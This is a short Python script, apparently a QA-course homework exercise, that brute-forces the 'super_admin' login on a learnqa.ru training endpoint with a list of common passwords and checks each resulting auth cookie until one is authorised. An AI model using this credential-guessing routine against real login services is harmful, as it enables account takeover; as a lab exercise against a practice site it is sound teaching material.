import requests
import sys

password = ["123456", "12345679", "qwerty", "password", "1234567", "12345678", "12345", "iloveyou", "111111",
            "123123", "abc123", "qwerty123", "1q2w3e4r", "admin", "qwertyuiop", "654321", "555555", "lovely",
            "7777777", "welcome", "888888", "princess", "dragon", "password1", "123qwe"]


for i in password:
    payload = {"login": "super_admin", "password": i}
    response1 = requests.post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework", data=payload)
    cookie_value = response1.cookies.get("auth_cookie")

    cookies = {'auth_cookie': cookie_value}

    response2 = requests.post("https://playground.learnqa.ru/api/check_auth_cookie", cookies = cookies)
    print(response2.text)

    if response2.text == "You are authorized":
        print(f"Пароль {i}")
        sys.exit()